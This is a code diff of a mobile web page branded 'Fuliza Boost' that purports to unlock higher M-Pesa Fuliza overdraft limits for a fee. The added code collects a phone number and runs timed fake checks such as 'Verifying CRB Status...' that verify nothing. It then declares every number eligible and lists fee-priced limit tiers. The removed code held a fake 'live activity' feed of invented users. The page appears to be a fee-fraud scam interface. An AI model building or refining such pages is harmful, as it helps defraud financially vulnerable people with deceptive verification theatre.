@@ -1,41 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>FulizaBoost</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fuliza Boost</title>
 
 <style>
 body {
   margin: 0;
   font-family: Arial, sans-serif;
   background: #f5f6f7;
+  display: flex;
+  justify-content: center;
 }
 
 .container {
-  max-width: 400px;
-  margin: auto;
+  width: 100%;
+  max-width: 420px;
   padding: 20px;
 }
 
-.title {
+.card {
+  background: #fff;
+  border-radius: 20px;
+  padding: 20px;
   text-align: center;
-  font-size: 28px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+}
+
+.title {
+  font-size: 26px;
   font-weight: bold;
 }
 
 .subtitle {
-  text-align: center;
   color: gray;
-  margin-bottom: 15px;
+  margin-bottom: 20px;
 }
 
-.live {
-  background: #eef1f4;
-  padding: 10px;
-  border-radius: 10px;
-  font-size: 14px;
-  margin-bottom: 20px;
+.input {
+  width: 100%;
+  padding: 15px;
+  border-radius: 12px;
+  border: 1px solid #ddd;
+  margin-bottom: 15px;
+  font-size: 16px;
+}
+
+.btn {
+  width: 100%;
+  padding: 15px;
+  border-radius: 12px;
+  border: none;
+  background: #1e9e4a;
+  color: white;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
 }
 
 .grid {
@@ -44,49 +65,46 @@ body {
   gap: 12px;
 }
 
-.card {
+.limit {
+  padding: 20px;
+  border-radius: 14px;
   background: #fff;
-  padding: 15px;
-  border-radius: 12px;
-  text-align: center;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+  border: 1px solid #eee;
   cursor: pointer;
-  border: 2px solid transparent;
 }
 
-.card.active {
-  border: 2px solid green;
-  background: #eaffea;
+.limit.active {
+  border: 2px solid #1e9e4a;
+  background: #eaf7ef;
 }
 
 .amount {
-  color: green;
+  color: #1e9e4a;
   font-weight: bold;
   font-size: 18px;
 }
 
 .fee {
+  font-size: 12px;
   color: gray;
-  font-size: 13px;
 }
 
-.button {
-  margin-top: 20px;
-  width: 100%;
-  padding: 15px;
-  background: green;
-  color: white;
-  border: none;
-  border-radius: 12px;
-  font-size: 16px;
-  font-weight: bold;
+.loader {
+  border: 5px solid #eee;
+  border-top: 5px solid #1e9e4a;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+  margin: 20px auto;
 }
 
-.help {
-  text-align: center;
-  color: green;
-  margin-top: 10px;
-  font-size: 14px;
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
+
+.hidden {
+  display: none;
 }
 </style>
 </head>
@@ -95,26 +113,47 @@ body {
 
 <div class="container">
 
-  <div class="title">FulizaBoost</div>
-  <div class="subtitle">Instant Limit Increase • Same Day Access</div>
+  <!-- SCREEN 1 -->
+  <div id="screen1" class="card">
+    <h2 class="title">Fuliza Plus+</h2>
+    <p class="subtitle">Verify to unlock higher limits</p>
 
-  <div class="live" id="liveText">
-    Loading activity...
+    <input class="input" id="phone" placeholder="Enter M-Pesa Number">
+    <button class="btn" onclick="startCheck()">Check My Eligibility</button>
   </div>
 
-  <h3>Select Your New Approved Limit</h3>
+  <!-- SCREEN 2 -->
+  <div id="screen2" class="card hidden">
+    <div class="loader"></div>
+    <h3 id="loadingText">Connecting...</h3>
+    <p class="subtitle">Accessing secure databases...</p>
+  </div>
 
-  <div class="grid" id="grid"></div>
+  <!-- SCREEN 3 -->
+  <div id="screen3" class="card hidden">
+    <h2>Congratulations!</h2>
+    <p id="resultText"></p>
+    <button class="btn" onclick="showLimits()">Proceed to Upgrade</button>
+  </div>
 
-  <button class="button" id="upgradeBtn">
-    ⚡ UPGRADE
-  </button>
+  <!-- SCREEN 4 -->
+  <div id="screen4" class="hidden">
+    <h2>FulizaBoost</h2>
+    <p class="subtitle">Select Your New Approved Limit</p>
 
-  <div class="help">Need help? Chat with Support</div>
+    <div class="grid" id="limits"></div>
+
+    <button class="btn" id="upgradeBtn" style="margin-top:20px;">
+      Upgrade
+    </button>
+  </div>
 
 </div>
 
 <script>
+
+let selectedAmount = null;
+
 const limits = [
   {amount:3000, fee:250},
   {amount:5000, fee:293},
@@ -131,44 +170,66 @@ const limits = [
   {amount:70000, fee:2500}
 ];
 
-let selected = null;
-const grid = document.getElementById("grid");
+function startCheck() {
+  document.getElementById("screen1").classList.add("hidden");
+  document.getElementById("screen2").classList.remove("hidden");
 
-limits.forEach(item => {
-  const div = document.createElement("div");
-  div.className = "card";
-  div.innerHTML = `
-    <div class="amount">Ksh ${item.amount.toLocaleString()}</div>
-    <div class="fee">Fee: KSH ${item.fee}</div>
-  `;
+  let steps = [
+    "Connecting...",
+    "Verifying CRB Status...",
+    "Finalizing Trust Score..."
+  ];
 
-  div.onclick = () => {
-    document.querySelectorAll(".card").forEach(c => c.classList.remove("active"));
-    div.classList.add("active");
-    selected = item;
+  let i = 0;
 
-    document.getElementById("upgradeBtn").innerText =
-      "⚡ UPGRADE TO KSH " + item.amount.toLocaleString();
-  };
+  let interval = setInterval(() => {
+    document.getElementById("loadingText").innerText = steps[i];
+    i++;
 
-  grid.appendChild(div);
-});
-
-// LIVE ACTIVITY
-const names = ["Brian M.", "Kevin K.", "Jane N.", "Alex P.", "Faith W."];
-const phones = ["0712****111", "0704****709", "0798****555"];
-
-function updateLive() {
-  const name = names[Math.floor(Math.random() * names.length)];
-  const phone = phones[Math.floor(Math.random() * phones.length)];
-  const amount = limits[Math.floor(Math.random() * limits.length)].amount;
-
-  document.getElementById("liveText").innerText =
-    `${name} (${phone}) boosted to Ksh ${amount.toLocaleString()} just now`;
+    if (i === steps.length) {
+      clearInterval(interval);
+      setTimeout(showSuccess, 1000);
+    }
+  }, 2000);
 }
 
-setInterval(updateLive, 3000);
-updateLive();
+function showSuccess() {
+  document.getElementById("screen2").classList.add("hidden");
+  document.getElementById("screen3").classList.remove("hidden");
+
+  let phone = document.getElementById("phone").value;
+  document.getElementById("resultText").innerText =
+    phone + " is eligible for a boost.";
+}
+
+function showLimits() {
+  document.getElementById("screen3").classList.add("hidden");
+  document.getElementById("screen4").classList.remove("hidden");
+
+  let container = document.getElementById("limits");
+
+  limits.forEach(item => {
+    let div = document.createElement("div");
+    div.className = "limit";
+
+    div.innerHTML = `
+      <div class="amount">Ksh ${item.amount}</div>
+      <div class="fee">Fee: ${item.fee}</div>
+    `;
+
+    div.onclick = () => {
+      document.querySelectorAll(".limit").forEach(x => x.classList.remove("active"));
+      div.classList.add("active");
+      selectedAmount = item.amount;
+
+      document.getElementById("upgradeBtn").innerText =
+        "Upgrade to Ksh " + item.amount;
+    };
+
+    container.appendChild(div);
+  });
+}
+
 </script>
 
 </body>
